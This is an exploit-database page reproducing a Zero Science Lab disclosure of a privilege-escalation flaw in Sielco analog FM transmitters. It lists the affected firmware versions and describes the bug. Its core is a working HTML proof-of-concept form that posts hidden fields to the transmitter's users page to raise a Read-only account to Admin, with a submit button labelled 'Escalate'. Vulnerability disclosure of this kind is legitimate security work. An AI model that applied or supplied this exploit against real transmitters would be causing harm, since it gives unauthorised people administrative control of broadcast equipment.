---
title: Sielco Analog FM Transmitter 2.12 Remote Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023040059
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-16
fetch_date: 2025-10-04T11:31:47.048544
---

# Sielco Analog FM Transmitter 2.12 Remote Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sielco Analog FM Transmitter 2.12 Remote Privilege Escalation** **2023.04.15**  Credit:  **[LiquidWorm](https://cxsecurity.com/author/LiquidWorm/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

<!--
Sielco Analog FM Transmitter 2.12 Remote Privilege Escalation
Vendor: Sielco S.r.l
Product web page: https://www.sielco.org
Affected version: 2.12 (EXC5000GX)
2.12 (EXC120GX)
2.11 (EXC300GX)
2.10 (EXC1600GX)
2.10 (EXC2000GX)
2.08 (EXC1600GX)
2.08 (EXC1000GX)
2.07 (EXC3000GX)
2.06 (EXC5000GX)
1.7.7 (EXC30GT)
1.7.4 (EXC300GT)
1.7.4 (EXC100GT)
1.7.4 (EXC5000GT)
1.6.3 (EXC1000GT)
1.5.4 (EXC120GT)
Summary: Sielco designs and produces FM radio transmitters
for professional broadcasting. The in-house laboratory develops
standard and customised solutions to meet all needs. Whether
digital or analogue, each product is studied to ensure reliability,
resistance over time and a high standard of safety. Sielco
transmitters are distributed throughout the world and serve
many radios in Europe, South America, Africa, Oceania and China.
Desc: The application suffers from a privilege escalation vulnerability.
A user with Read permissions can elevate his/her privileges by sending
a HTTP POST request setting the parameter 'auth1' or 'auth2' or 'auth3'
to integer value '1' for Write or '2' for Admin permissions.
Tested on: lwIP/2.1.1
Web/3.0.3
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2023-5755
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5755.php
26.01.2023
-->
<html>
<body>
<form action="http://transmitter/protect/users.htm" method="POST">
<input type="hidden" name="pwd0" value="" />
<input type="hidden" name="pwd0bis" value="" />
<input type="hidden" name="user1" value="" />
<input type="hidden" name="pwd1" value="" />
<input type="hidden" name="pwd1bis" value="" />
<input type="hidden" name="auth1" value="" />
<input type="hidden" name="user2" value="test" />
<input type="hidden" name="pwd2" value="" />
<input type="hidden" name="pwd2bis" value="" />
<input type="hidden" name="auth2" value="2" />
<input type="hidden" name="user3" value="" />
<input type="hidden" name="pwd3" value="" />
<input type="hidden" name="pwd3bis" value="" />
<input type="hidden" name="auth3" value="" />
<input type="submit" value="Escalate" />
</form>
</body>
</html>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040059)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top